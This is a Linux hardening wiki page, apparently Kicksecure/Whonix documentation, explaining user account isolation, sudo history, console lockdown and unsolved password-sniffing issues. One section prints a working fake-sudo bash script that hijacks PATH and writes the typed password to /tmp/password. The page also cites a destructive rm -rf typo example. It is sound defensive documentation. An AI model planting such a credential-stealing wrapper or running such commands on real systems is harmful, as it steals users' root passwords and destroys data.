'''User account isolation and root rights is a very relevant, but often overlooked security topic''' for many Linux distributions. In this chapter we will give you an overview about the history, possible attack vectors, security measures that you can implement yourself, and the '''plenty of security measures that are implemented in {{project_name_short}} by default'''.
}}

We are aiming to provide a comprehensive, rather complete overview. There are many advanced details being discussed in many places on the internet, but explanations of the essential foundations are hard to find. When this topic is usually discussed, there is a large amount of unspoken assumptions and threat models. 

'''Example''': {{Quotation
|quote=The solution to this is simple: you shouldn't be logging in on the console as root in the first place! (What, are you crazy or something?). Proper Unix hygiene dictates that you should log in as yourself, and su to root as necessary. People who spend their day logged in as root are just begging for disaster.
|context=XScreenSaver FAQ, answer to "[https://www.jwz.org/xscreensaver/faq.html#root-lock When I'm logged in as root, XScreenSaver won't lock my screen!]"
}} 

Sounds quite important, right? Is it? What kind of disaster awaits if being logged in as root? No automatic security disaster. Many applications (such as Kate; Wayland) refuse to run as root. Due to this convention, it is best to go with the flow (what most Linux distributions do) and avoid being logged in as root. As many actions as possible should be done with a non-root user.

* '''Avoiding root compromise:''' Useful for reasons explained in chapter [[Root#Rationale|Rationale]].
* '''Applications under separate user accounts:''' Many applications nowadays run under different Linux user accounts. For example, the web server and database server very likely run under different Linux user accounts.
* '''Context and threat models:''' Many of the things written about sudo, su, root, and user isolation are correct but were written in a different time and/or with a different threat model in mind.
* '''Is sudo a security tool?''' Yes. But what does this mean? sudo provides an audit trail. It keeps a log of all invocations of sudo. Specifically, if there are multiple system administrators, and there is an unexplained issue, they can look at the logs and investigate who performed which action. By default, this only works in non-malicious cases. An attacker with root rights also has the ability to remove evidence of their own actions from logs. Secure, tamper-proof append-only logs is a different security problem to solve.
* '''Password input security:''' The sudo project does not guarantee a secure password entry mechanism. Various attack vectors, such as malware, can compromise password security by intercepting or sniffing passwords entered via sudo. This is elaborated in chapter [[Dev/Strong_Linux_User_Account_Isolation#Issues|Issues]].
* '''Password encryption:''' But how can malware steal the password? Aren't passwords encrypted? Yes, passwords are encrypted in the <code>/etc/shadow</code> file. Additionally, non-root users cannot read the <code>/etc/shadow</code> file thanks to default file permissions. This, however, is of little help against malware. As elaborated in chapter [[Dev/Strong_Linux_User_Account_Isolation#Issues|Issues]], what malware actually can do to steal the password does not involve attacking the encryption. The encryption of passwords in <code>/etc/shadow</code> is only useful in a different threat model. For example, if an attacker gained access to <code>/etc/shadow</code> (by possibly getting access through full system compromise), then at least the attacker still does not know the user's password. This can be useful in case the user re-used this password elsewhere, for example to log in to their online banking.
* '''Single-user system vs multi-user system:''' The usefulness of sudo also depends on whether it is a single-user system or a multi-user system. This is elaborated in chapter [[Default_Passwords#Information|Information]].
* '''Local system vs remote server:''' When using password-based login, the user password matters. However, password-based logins are only safe when logging into a machine locally. Public key authentication is much more secure for remote access.

= Essentials =

In this chapter we would like to introduce the topic of user account isolation more broadly.

== History ==

* '''Root password sharing issues:''' Historically, sharing the root password was problematic when one computer was shared by multiple system administrators. If someone changed the root password without properly recording the new password, other administrators could no longer log in.
* '''Development of sudo:''' To address this issue, sudo was developed.
* '''Functionality of sudo:''' With sudo, individual users could:
** Log in as root (<code>sudo su</code>)
** Execute individual commands with root rights (<code>sudo command</code>).
* '''Insight from sudo's co-author:''' {{Quotation
|context=Bob Coggeshall, co-author of sudo <ref>Bob Coggeshall is mentioned on [https://www.sudo.ws/about/history/ sudo history].</ref>, [https://security.stackexchange.com/a/233042 complete answer here]
|quote=I am the co-author of sudo. It was written in the early 80's specifically to address a need to protect the integrity of a shared resource (A VAX-11/750 running BSD UNIX) from its users (the faculty of the CS Department at SUNY/Buffalo). At the time, the only other option was 'su' which required everyone share a single password. Had a calamity occurred it would have been difficult or impossible to sift through the forensics ...
}}

== Isolation rationale and benefits ==

Oftentimes, when we think of a user account, we think of an account on the system that someone is intended to log into. However, most systems have a large number of user accounts, even if they are only intended to be used by a single person. This is because many background processes run on most computers. 

* '''Attack surface and sensitive data:''' Many of these background processes introduce some form of attack surface or work with sensitive information that other background processes or other people should not be able to access.
* '''Restricted permissions:''' To reduce the risk of unauthorized access or severe damage in the event of a compromise, these services are given user accounts with appropriately restricted permissions. 
* '''Compromise containment:''' If a background process becomes compromised, the attacker will not be able to easily read or write data that the user account restricts them from accessing.

'''When properly implemented, user account isolation provides three main benefits:'''
* '''Protection of system accounts:''' 
** '''Attack prevention:''' Hinders system accounts from attacking other system accounts or people's user accounts.
** '''Risk reduction:''' Reduces (though does not eliminate) the risk of a compromised service resulting in the entire system being compromised.
* '''Protection of people's user accounts:''' 
** '''Account isolation:''' Hinders people's user accounts from attacking other people's user accounts or system accounts.
** '''Malicious user prevention:''' Reduces (though does not eliminate) a malicious user's ability to steal data or compromise accounts they aren't supposed to access.
** '''Multi-user system relevance:''' This is particularly useful on systems used by more than one person, such as server machines.
* '''Root account protection:''' 
** '''Unauthorized access prevention:''' Hinders both system accounts and people's user accounts from gaining unauthorized access to the root account.
** '''Frequent attack target:''' Since root account access allows one to access any data or compromise any accounts or processes on the system, it is a frequent target for attackers.

{{Anchor|Defenses}}

In this chapter we compare non-hardened vs. {{project_name_short}}-hardened Linux Distributions and discuss various defense strategies implemented by {{project_name_short}}.

== Non-Hardened Linux Distributions ==

{{mbox
|icon=fa-solid fa-arrow-down cs-red
|text=Defenses: low - for most if not all Linux desktop operating systems
}}

* '''Root compromise risk with sudo accounts:''' 
** '''Equal to root compromise:''' By default, a compromised non-root user account that is a member of the group <code>sudo</code> is almost equivalent to a full root compromise. 
** '''Password retrieval risk:''' There are too many ways for an attacker to retrieve the sudo password.
** '''Malware risk:''' See: [[#sudo password sniffing|Malware can sniff the sudo password]].

* '''Non-sudo account compromise:''' 
** '''Conditions for root compromise:''' Compromised non-root accounts that are not members of the group <code>sudo</code> require either:
*** '''A)''' A local privilege escalation exploit, <u>or</u>
*** '''B)''' Brute-forcing the root password.
** '''Example scenario:''' If the web server account (<code>www</code>) becomes compromised, it cannot gain root without fulfilling one of these conditions.

* '''Home folder readability:''' 
** '''Cross-account data access:''' By default, the home folder (<code>~</code>) of one account (e.g., <code>/home/user</code>) might be readable by other accounts (e.g., <code>user2</code> or <code>www</code>).
** '''Reduced file permission effectiveness:''' This significantly reduces the usefulness of Linux file permissions.
** '''Data exfiltration risk:''' While compromised user accounts might not be able to destroy other user account's data, they can exfiltrate all private user data.

{{project_name_short}} implements various mechanisms to implement strong linux user account isolation:

* [[#Console Lockdown|Console Lockdown]]
* [[#Bruteforcing Linux Account Passwords Protection|Anti Bruteforcing of Linux User Account Passwords]] ([[#Online Password Cracking Restrictions|Online Password Cracking Restrictions]])
* [[#/etc/securetty|<code>/etc/securetty</code>]]
* [[Dev/Strong_Linux_User_Account_Isolation#Root_Login_Disabled|Root Login Disabled]]
* [[#su restrictions|su restrictions]]
* [[#sudo restrictions|sudo restrictions]]
* [[#Permission Lockdown|permission lockdown]]: Access rights restrictions such as for example home folder (<code>~</code>) of account <code>user</code> <code>/home/user</code> being readable only by account <code>user</code> and not by account <code>www</code>.
* [[#umask hardening|umask hardening]]
* [[#libpam-tmpdir|libpam-tmpdir]]
* <u>Usability</u>: if the advanced advice to [[#Prevent Malware from Sniffing the Root Password|Prevent Malware from Sniffing the Root Password]] is not followed, then users will only require a single, secure root password for the user <code>user</code> account. It is no longer necessary to have two secure passwords for the user <code>user</code> and root accounts. <ref>
On the flip-side, if the [[#Prevent Malware from Sniffing the Root Password|Prevent Malware from Sniffing the Root Password]] steps are followed, two secure passwords are required for the user <code>user</code> and user <code>sysmaint</code> accounts.
</ref>

[[root#Prevent Malware from Sniffing the Root Password|Prevention of Malware Sniffing the Root Password]] is currently only functional for advanced users following the [[root|documentation]].

Once proposal [[Dev/user-sysmaint-split|user-sysmaint-split (Role-Based Boot Modes)]] has been implemented there will be a strong guidance for users to better separate their limited (everyday use) account (<code>user</code>) and administrative account (<code>sysmaint</code>). This would result in a robust [[root#Prevent Malware from Sniffing the Root Password|Prevention of Malware Sniffing the Root Password]].

== Console Lockdown ==

Console lockdown restricts console access to members of the group <code>console</code>. Everyone else, except members of the group <code>console-unrestricted</code>, is restricted from using the console. This includes blocking access via ancient, unpopular login methods such as <code>/bin/login</code> over networks, which might be exploitable ([https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0797 CVE-2001-0797]). This is implemented using <code>pam_access</code> for the PAM service <code>login</code> (<code>/etc/pam.d/login</code>), and is part of the package [https://github.com/{{project_name_short}}/security-misc security-misc].

[https://github.com/{{project_name_short}}/security-misc/blob/master/usr/libexec/security-misc/pam-info This also has good usability.] Attempts to log in to the console by users who are not members of the group <code>console</code> result in an error message.

By {{project_name_long}} default:
* Console lockdown is [https://github.com/{{project_name_short}}/dist-base-files/blob/master/debian/dist-base-files.postinst enabled by] default in {{project_name_short}} version <code>15.0.0.8.7</code> and above.
* Only the user <code>user</code> is a member of the group <code>console</code> by default.
* There are no default members of the group <code>console-unrestricted</code>.

Bruteforcing into Linux user accounts is severely limited by the package [https://github.com/{{project_name_short}}/security-misc security-misc].

'''Issues:'''
* '''PAM issue''': [https://github.com/linux-pam/linux-pam/issues/842 pam_faillock tally and lockout status is reset by running a command with a NOPASSWD exception using sudo]
* '''sudo issue''': [https://github.com/sudo-project/sudo/issues/415 NOPASSWD exceptions in /etc/sudoers(.d) interact poorly with pam_faillock; no configuration option exists to allow sudo to tell PAM when a NOPASSWD command is being run]
** Solution for these two issues: [[Dev/user-sysmaint-split]]

== Online Password Cracking Restrictions ==

A secure password for root/user accounts does not necessarily have to follow the rationale explained on the [[Passwords]] page. Offline attacks against the password (parallelization, password cracking attempts limited only by RAM, disk, and CPU) are not possible. Only "online" attacks are feasible, similar to attempts to crack a password of a user account on a website. 

These attacks are limited to a specific number of attempts (e.g., 50 failed login attempts) within a defined time period (TODO). After the limit is reached, the account is locked, and additional steps, such as a password unlock procedure, are required.

== /etc/securetty ==

The package [https://github.com/{{project_name_short}}/security-misc security-misc] removes all non-comment lines from <code>/etc/securetty</code>. As a result, root login and ancient console-based root login attempts are effectively disabled.

* Configuration details: [https://github.com/{{project_name_short}}/security-misc/blob/master/etc/securetty.security-misc securetty configuration]

|text=User access control in PAM
}}

== Root Login Disabled ==

Root login has been disabled by default since {{project_name_short}} <code>15.0.0.3.6</code>.

For users that require account password protection, having only one user account with a password and no root account login by default simplifies security. This setup ensures users only need to remember and secure one strong password instead of two.

'''Usability:'''
* Root login failures do not count as failed login attempts, thanks to the <code>faillock</code> implementation by [[security-misc]].

Documentation: [[root]]

== su restrictions ==

By default in Debian, any user account can attempt to use <code>su</code> to switch to the root user or another user account. This means any user can attempt to bruteforce switching to another account. [[Kicksecure]] / [[Whonix]] (via the package [https://github.com/{{project_name_short}}/security-misc security-misc]) restricts this behavior by requiring group <code>sudo</code> membership to use <code>su</code>, utilizing [https://manpages.debian.org/pam_wheel pam_wheel].

* Configuration details: [https://github.com/{{project_name_short}}/security-misc/blob/master/usr/share/pam-configs/wheel-security-misc PAM wheel configuration]

Additionally, [[Security-misc#SUID_Disabling_and_Permission_Hardening|SUID Disabling and Permission Hardening]] by security-misc removes SUID from <code>su</code> and many other binaries by default for further hardening.

<code>su</code> access of <code>user3</code> for <code>root</code> failed because <code>user3</code> was a member of group <code>sudo</code>.

== Console Login Attacks ==

Blocking access to <code>su</code> would be ineffective if a compromised user account could log into another user account by switching to a virtual terminal and bruteforcing the password. However, this is not possible due to access controls enforced by the Linux kernel. This section explains how this works.

The Linux kernel provides various virtual console devices to userspace, typically through the <code>/dev/tty*</code> devices. To switch between virtual console devices, the user must have write access to at least one of these devices. By default:

* These devices are owned by root.
* They can only be read and written by the owning user.

This ensures that non-root processes cannot access virtual consoles without root privileges.

One or more <code>login</code> processes are automatically started on some of these virtual terminals by the <code>init</code> program. These processes run as root and provide a login prompt to the user. They cannot be accessed without the ability to read from and write to the virtual console each process runs on. 

Due to the permission restrictions mentioned above, no user process can log into the system as another user through the console without already having root privileges. When a user logs in using a virtual console, the <code>login</code> process controlling that console changes the permissions on it so that the user who just logged in can read and write data on that console. This allows the user to interact with any program executed on the console (typically a shell such as <code>bash</code>).

Once the user logs out, the console device's permissions revert, preventing processes running as the user from exploiting the console login system to log in as another user.

{{quotation
|quote=This is about where the process is started and what has connected as controlling terminal. It isn't anything Qubes specific. A non-privileged process cannot inject characters into a separate session (let's forget about X11 breaking all this assumptions, as we are talking about non-X11 session), especially if it's of a different user, similarly as it cannot write to files it doesn't have write permission. to. You can think of it as a write access to <code>/dev/tty</code> (or <code>/dev/hvc0</code> in this case). When you login on <code>/dev/hvc0</code>, login process (running as root) will setup permission to <code>/dev/hvc0</code> and also pass an open FD to it to your shell. Then, you (user, and that shell) will be able to interact with <code>/dev/hvc0</code> and specifically run commands connected to it. If you don't login there, login process will not set the permissions, so you won't have access.
This does assume kernel enforced permissions are effective, but as we are talking here about in-VM account isolation only, it's a reasonable assumption.
|context=[https://github.com/QubesOS/qubes-issues/issues/2695#issuecomment-521646366 Comment by Marek Marczykowski-Górecki, Qubes lead developer]
}}

This raises the question of how it is possible to switch between virtual consoles using a keypress such as Ctrl+Alt+Fn, or by using a command such as <code>chvt</code>. Virtual console switching is done by one of two things - the kernel virtual console code itself, or a program that can control any one of the virtual console devices. 

If you are logged in at a TTY, and press a Ctrl+Alt+Fn key combo, the kernel's virtual console code will detect the keypress and switch to the desired virtual terminal.

If you use the <code>chvt</code> command while logged into a virtual terminal, it will be able to switch to another virtual terminal because the virtual terminal the user logged in at is now readable and writable by the logged-in user. It can thus access it and tell the kernel virtual terminal code to switch to a different virtual terminal.

When you have a running graphical session, things are slightly more complicated. The X server will take control of one of the virtual consoles, and when one presses Ctrl+Alt+Fn, that keypress will go to X, not the kernel virtual console code. In this instance, X will interpret the keypress and instruct the kernel's virtual terminal code to switch to the user's desired virtual console.

With the above rules in place, the only way to gain read/write access to a virtual terminal is to:
* Have physical access to the computer, thus giving one the ability to communicate directly with the kernel virtual terminal code.
* Or, be running under a user account that has logged in at a virtual terminal already.
** In this latter instance, software running as the logged-in user could ''switch'' to a different virtual terminal, but it would not be able to attempt to login at that terminal. That would require read/write access to the virtual terminal that was switched to. Virtual terminals that have a login prompt are only able to be read from and written to by root or a person with physical access to the machine.

It is also possible to communicate with an application that is controlling a virtual terminal. The most obvious example of this is when the X server is running as root (which it does by default on Debian-based systems, Kicksecure included).

In this instance, it is possible to perform some limited console-level actions (namely switching to a different virtual terminal) even without direct read/write access to any virtual terminal device (for instance, by using <code>xdotool</code> to emulate a Ctrl+Alt+Fn keypress).

Even in this scenario, however, a malicious process that did this would not be able to login at the virtual terminal that was switched to, because it would not have read/write access to the virtual terminal that it switched to.

== sudo restrictions ==
By Debian default, users who are not members of the group <code>sudo</code> cannot use <code>sudo</code>. Therefore limited user accounts (for example user <code>sdwdate</code>) cannot use <code>sudo</code> to attempt to crack other user account passwords to run under these users.

== Permission Lockdown ==
{{anchor|access rights restrictions}}
Strong Linux User Account Separation. Access rights restrictions.

For example, <code>user1</code> using home folder <code>/home/user1</code> cannot read <code>user2</code>'s files in the <code>/home/user2</code> home folder.

Removes read, write, and execute access for others for all users who have home folders under the folder <code>/home</code> by running, for example, <code>chmod o-rwx /home/user</code> during package installation, upgrade, or PAM <code>mkhomedir</code>. This will be done only once per folder in the <code>/home</code> directory, so users who wish to relax file permissions are free to do so. This protects previously created files in user home folders that were created with lax file permissions prior to the installation of the security-misc package.

== umask hardening ==
Complements Permission Hardening for folders outside of <code>/home</code>.

The <code>umask</code> (user file-creation mode mask) determines the default file permissions for newly created files and directories. By default, many systems set the umask to <code>022</code>, allowing read access to all users. For enhanced security, especially in multi-user environments, it's advisable to set a more restrictive <code>umask</code>, such as <code>027</code>, which restricts new files and directories to be accessible only by their owner.

The default <code>umask</code> for files created by non-root users, such as the <code>user</code> account, is set to <code>027</code>.

This behavior is achieved through the PAM module configuration: <code>pam_mkhomedir.so umask=027</code>.

By setting this value, files created by non-root users are protected from being read by other non-root users by default. Although the <code>/home</code> folder is already secured by Permission Lockdown, this configuration provides additional safeguards for directories like <code>/tmp</code>.

<code>group</code> read permissions are retained, which is safe due to Debian's implementation of User Private Groups (UPGs). For further details, refer to: [https://wiki.debian.org/UserPrivateGroups User Private Groups].

The root <code>umask</code> remains unchanged because system configuration files in <code>/etc</code> require "others" read access to avoid breaking applications. Examples of such files include <code>/etc/firefox-esr</code> and <code>/etc/thunderbird</code>. To address this, the <code>umask</code> for root is configured to <code>022</code> via <code>sudoers</code>, ensuring files created by root remain world-readable. This includes actions like <code>sudo vi /etc/file</code> or <code>sudo -i; touch /etc/file</code>.

= General Issues =
{{Anchor|Issues}}

'''In this chapter general Linux-specific issues are discussed'''. These issues are [[unspecific|unspecific to {{project_name_short}}]]. Most if not all Freedom Software Linux desktop distributions are affected by one or multiple of these issues.

== sudo password sniffing ==

A compromised account <code>user</code> could be infected with a keylogger (which unfortunately, does not even require root access) that could trivially read the <code>sudo</code> password and thereby acquire root access.

Therefore, instructions to [[Root#Prevent_Malware_from_Sniffing_the_Root_Password|Prevent Malware from Sniffing the Root Password]] are required. This is intended for advanced users only, as awareness and usability are poor.

In the future, [[Dev/user-sysmaint-split|user-sysmaint-split (Role-Based Boot Modes)]] might solve this issue.

'''Reasons:'''
* '''Guidance for account separation''': Users would have strong guidance to separate the use of the limited account <code>user</code> through different boot modes.
* '''Group membership''': [[Dev/user-sysmaint-split#user_group_sudo_membership|user group sudo membership]]
* '''Exclusive sudo access''': Only account <code>sysmaint</code> would have the ability to use privilege escalation tools such as <code>sudo</code>, <code>pkexec</code>. ([[Dev/user-sysmaint-split#No_Access_to_Privilege_Escalation_Tools_for_Limited_Users|No Access to Privilege Escalation Tools for Limited Accounts]])
* '''Group membership''': [[Dev/user-sysmaint-split#user_group_sudo_membership|user group sudo membership]]
* '''Separation of risky activities''': Everyday activities considered higher risk, such as browsing the internet, would be done clearly separated under account <code>user</code>, while activities such as package installation and system upgrades would be performed using the separate account <code>sysmaint</code>.
* '''Reduced risk of password sniffing''': The more likely compromised account <code>user</code> would not have a chance to sniff the <code>sudo</code> password, thus hindering it from escalating to root without a local privilege escalation exploit.

== X Windows System ==
Any graphical application running under X Windows System (X11) can see what any account is typing in any other application for any account.
For example, if account <code>user</code> running X11 would run <code>lxsudo -u limited-account some-application</code> a compromised graphical application could sniff anything that account <code>user</code> is writing. Including but not limited to any <code>sudo</code> password prompts. This is also the case for applications running under mandatory access control framework [[AppArmor]].

See the following footnotes for references about security issues with GUI isolation related to X Windows System (X11). <ref>

Why “I” can do it but account “man” cannot? What makes “me” and account “man” different?

On non-Qubes Debian I am always wondering if I can switch a virtual console using ctrl + alt + F1, why can account “man” not? And how’s that different in Qubes?

This is about where the process is started and what has connected as controlling terminal. It isn’t anything Qubes specific. A non-privileged process cannot inject characters into a separate session (lets forget about X11 breaking all this assumptions, as we are talking about non-X11 session), especially if it’s of a different account, similarly as it cannot write to files it doesn’t have write permission to. You can think of it as a write access to /dev/tty* (or /dev/hvc0 in this case). When you login on /dev/hvc0, login process (running as root) will setup permission to <code>/dev/hvc0</code> and also pass an open FD to it to your shell. Then, you (<code>user</code>, and that shell) will be able to interact with <code>/dev/hvc0</code> and specifically run commands connected to it. If you don’t login there, login process will not set the permissions, so you won’t have access. &gt; This does assume kernel enforced permissions are effective, but as we are talking here about in-VM account isolation only, it’s a reasonable assumption.

Indeed.

While [https://forums.whonix.org/t/enforce-kernel-module-software-signature-verification-module-signing-disallow-kernel-module-loading-by-default/7880/40 experimenting] with module loading disabling, I experienced that broken X can block switching to [https://www.whonix.org/wiki/Desktop#Virtual_Consoles virtual console]. Needless to say (for other readers), if X can do, also malware could do. “SysRq + r” can take away control from X. After that, switching to another virtual console was possible.
</blockquote>

@marmarek

<blockquote>
Yes, X (or other process with access to input device) can grab it for exclusive access, disabling Alt+Ctrl+F1 or similar combos. This still is independent of what is happening on other terminals. Especially, input devices grabbed in this mode are handled by X server (or other process that grabbed them). As long as X server doesn’t have access to other terminals, it still can’t influence them.

== /proc/pid/sched spy on keystrokes ==

The <code>/proc</code> filesystem leaks a significant amount of information about other processes, allowing attackers to spy on certain processes extensively. One example is <code>/proc/pid/sched</code>, which enables attackers to spy on keystrokes. However, the information leakage extends far beyond just that.

* [https://forums.whonix.org/t/proc-pid-sched-spy-on-keystrokes-proof-of-concept-spy-gksu/8225 Whonix Forums: Proof of Concept - Spy on Keystrokes]

* [https://forums.whonix.org/t/apparmor-for-complete-system-including-init-pid1-systemd-everything-full-system-mac-policy/8339/363 Whonix Forums: Full-System MAC Policy Discussion]

'''Potential solutions:'''
* '''<code>hidepid=2</code> mount option''': This hides processes from other accounts, preventing spying on processes of other accounts. However, the benefits are limited unless multiple accounts are used, as most users run most applications under the same account.
* '''PID namespaces''': These hide processes from outside the namespace and can be used for sandboxing apps, effectively preventing spying on processes outside of the sandbox.
* '''[https://github.com/roddhjav/apparmor.d apparmor.d] profiles''': This provides fine-grained restrictions over <code>/proc</code>, offering a more targeted approach to mitigating information leakage.

== LD_PRELOAD ==

<code>LD_PRELOAD</code> is an environment variable that specifies certain libraries to preload for an application. An attacker can exploit this by preloading their malicious library globally to log keystrokes or, even worse, hijack the program.

There are numerous examples of <code>LD_PRELOAD</code> rootkits in Linux. One example is:

* [https://github.com/Aishou/wayland-keylogger wayland-keylogger]

'''Potential solutions:'''
* Use environment scrubbing for everything in <code>apparmor.d</code>.

== Setting up a fake sudo ==

An attacker can set up a fake <code>sudo</code> binary to trick the user into providing their password. Below is a simple example attack implementation demonstrating how this could be accomplished:

{{CodeSelect|code=
cat <<\EOF > /tmp/sudo
#!/bin/bash
if [[ "${@}" = "" ]]; then
  /usr/bin/sudo
else
  read -r -p "[sudo] password for user: " password
  echo "${password}" > /tmp/password
  echo "Sorry, try again."
  /usr/bin/sudo ${@}
fi
EOF
chmod +x /tmp/sudo
export PATH="/tmp:${PATH}"
}}

This example attack implementation could theoretically be improved further, but that is beside the point being made here.

Even specifying the file path of the real <code>sudo</code> binary would not work:

{{CodeSelect|code=
function /usr/bin/sudo { echo "Doesn't work"; }
function /bin/sudo { echo "Doesn't work"; }
}}

'''Non-Solutions:'''
* '''[[noexec]]''': Mounting all user-writeable places such as <code>/home</code> and <code>/tmp</code> as non-executable is not a viable solution because an attacker can bypass these restrictions by using the bash interpreter, for example: <code>bash /path/to/script</code>. Would [https://forums.whonix.org/t/lock-down-interpreters-compilers-interpreter-lock-compiler-lock/18499 interpreter lock] help?

'''Potential solutions:'''
* None, except getting rid of <code>sudo</code> access, which is planned [[Sysmaint|sysmaint - System Maintenance User]] / [[Dev/user-sysmaint-split|user-sysmaint-split]].

== Device timing sidechannels ==

Device timing sidechannels <i>may</i> allow keylogging but more research needs to be done on this.

https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options#Eliminate_stat/notify-based_device_sidechannels

<blockquote>
If you say Y here, timing analyses on block or character devices like /dev/ptmx using stat or inotify/dnotify/fanotify will be thwarted for unprivileged users. If a process without CAP_MKNOD stats such a device, the last access and last modify times will match the device’s create time. No access or modify events will be triggered through inotify/dnotify/fanotify for such devices.
This feature will prevent attacks that may at a minimum allow an attacker to determine the administrator’s password length.
</blockquote>

Potential solutions:

* linux-hardened fixes this by restricting it to CAP_MKNOD <ref>https://github.com/anthraxx/linux-hardened/commit/72b66e85807fd92b0c8ee53df59492806a6234aa</ref>

== Default Empty Password Security Impact ==
Does a default password such as <code>changeme</code> provide better security than an empty by default password? No, because malware could easily use [https://forums.whonix.org/t/dsudo-default-password-sudo/8766 <code>dsudo</code>] to enter <code>changeme</code> into the sudo prompt.

== Rationale for Change from Default Password changeme to Empty Default Password ==

* '''Usability:''' Better usability.
* '''No impact on security:''' See [[#Default Empty Password Security Impact|Default Empty Password Security Impact]].
* '''Security theater:''' A default public known account password for user <code>user</code> is security theater. Due to many [[Dev/Strong_Linux_User_Account_Isolation#Issues|issues]], having a user password to password protect running <code>sudo</code> from the user account is also security theater in many contexts. When a user password makes sense is documented in the user documentation.
* '''User documentation:''' See [[Default Passwords]].
* '''Real security:''' See the [[root|Safely Use Root Commands]], especially [[Root#Prevent_Malware_from_Sniffing_the_Root_Password|Prevent Malware from Sniffing the Root Password]] (SysRq based solution).
* '''Root login:''' [[Dev/Strong_Linux_User_Account_Isolation#Root_Login_Disabled|Root Login Disabled]] remains unchanged.
* '''No user freedom restriction:''' The users ability to configure a user account password remains unchanged. It is still possible to set a password.
* '''Accidental copy/paste of sudo command not a concern:''' A terminal window is very powerful, dangerous in any case. One needs to know what one is doing. A destructive command such as <code>rm -rf ~/file-name *</code> where the user actually meant to write <code>rm -rf ~/file-name*</code> can delete all user data. Only preventing <code>sudo</code> does not make a sufficient difference.
* '''Secure Administrative Rights Prompt Infeasibility:''' There are too many [[Dev/Strong_Linux_User_Account_Isolation#Issues|issues]] which prevent the creation of a secure root prompt that cannot be trivially broken by malware. It is technically challenging to fix all of them. These are generic issues applicable to most if not all Freedom Software desktop Linux distributions. In other words, these issues are [[unspecific|unspecific to {{project_name_short}}]].
** '''Future:''' A "boot into sysmaint mode" feature is planned. This is elaborated in chapter [[Dev/Strong_Linux_User_Account_Isolation#sudo_password_sniffing|sudo password sniffing]].
* '''Comparison:''' How did Google Android and Apple iOS solve this issue? By having developed different graphical interfaces and user freedom restrictions where [[Miscellaneous_Threats_to_User_Freedom#Administrative_Rights|the used is being refused administrative rights]].
* Forum discussion: [https://forums.whonix.org/t/whonix-default-password-changeme-impact/13115 default password (changeme) impact]

== Default Password Implementation Level ==
What technically changed.

Instead of running <code>echo "${user_to_be_created}:${password}" | chpasswd --encrypted</code>, now <code>passwd --delete user</code> is run during the build process in dist-base-files [https://github.com/Kicksecure/dist-base-files/blob/master/debian/dist-base-files.postinst <code>debian/dist-base-files.postinst</code>].

= Conclusions =

* In {{Kicksecure}} based Linux distributions:
** On <u>single-user</u> systems (with a single human used account only):
*** <u>Assessment</u>: There should be no way for potentially compromised applications running under limited Linux accounts (such as for example account <code>sdwdate</code>) - if compromised by malware - to login to other accounts such as <code>root</code> or account <code>user</code>. This is thanks to the following security features:
**** '''A)''' [[#Console Lockdown|Console Lockdown]]
**** '''B)''' [[#su restrictions|su restrictions]]
**** '''C)''' [[#sudo restrictions|sudo restrictions]]
**** '''D)''' [[#Bruteforcing Linux Account Passwords Protection|Bruteforcing Linux Account Passwords Protection]]
**** '''E)''' [[#Online Password Cracking Restrictions|Online Password Cracking Restrictions]]
*** <u>Malware Compromise Considerations</u>: Strong Linux account passwords should be unnecessary for protection from locally running malware unless above security features can be circumvented.
** On <u>multi-user</u> systems:
*** <u>Definition</u>: A multi-user system is defined here as a shared computer that has multiple human users.
*** <u>Assessment</u>: Similar to single-user systems, but additional Linux accounts (such as for example account <code>user<u>2</u></code>) will need to be added to Linux user group <code>console</code>. Therefore security feature Console Lockdown (A) will be ineffective against attacks from the added accounts. In effect, strong Linux account passwords are more important. However, other security features (B, C, D, E) still providing protection.
** <u>Remote Login</u>:
*** Systems using remote login (such as [[SSH]]): A strong password might make sense during initial SSH setup, before public key authentication has been set up. Once exclusively using public key authentication, password authentication should be disabled entirely. Once public key authentication is being used exclusively, a strong password should be no longer required for remote login.
*** Systems not using remote login: No requirements for a strong password to protect remote logins since not using any remote login mechanism.
** <u>Threat</u>: Could a compromised account <code>user</code> escalate to <code>root</code> if account <code>user</code> was compromised?
*** If using procedure [https://www.kicksecure.com/wiki/Root#Prevent_Malware_from_Sniffing_the_Root_Password Prevent Malware from Sniffing the Root Password]: no
*** If not using procedure Prevent Malware from Sniffing the Root Password: yes, due to [[#Issues|issues]].
** <u>[https://www.kicksecure.com/wiki/Protection_Against_Physical_Attacks Protection against Physical Attacks]</u>: This is a mostly unrelated issue. A [https://www.kicksecure.com/wiki/Protection_Against_Physical_Attacks#Screen_Lock screen lock] might be sufficient protection from lesser adversaries. In that case, a host screen locker and a better, non-default Linux account password on the host operating system might help, as the login password will also be used for the screen lock.
